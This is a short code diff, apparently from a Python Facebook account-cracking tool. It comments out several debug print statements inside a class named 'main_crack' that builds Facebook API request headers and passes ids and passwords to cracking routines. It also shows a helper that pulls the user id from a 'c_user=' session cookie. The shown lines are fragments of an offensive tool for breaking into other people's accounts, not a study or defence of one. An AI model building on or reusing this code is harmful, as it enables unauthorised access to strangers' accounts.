@@ -90,7 +90,7 @@ try:
 except Exception as e:
  print('')
 prd=open('.prd.txt','r').read().splitlines()
-print(prd)
+#print(prd)
 #-----userid-separate----#
 def user_id(coki):
     c_user_index = coki.find('c_user=')
@@ -515,8 +515,8 @@ class main_crack():
                  'user-agent': ua89,
                  'content-type': 'application/x-www-form-urlencoded', 
                  'x-fb-http-engine': 'Liger'}
-                print(data)
-                print(headers)
+                #print(data)
+                #print(headers)
                 #Elite(__UBI___,sid,ps,cookie)
                 #fike(__UBI___,sid,ps)
                 rakib(sid,ps)
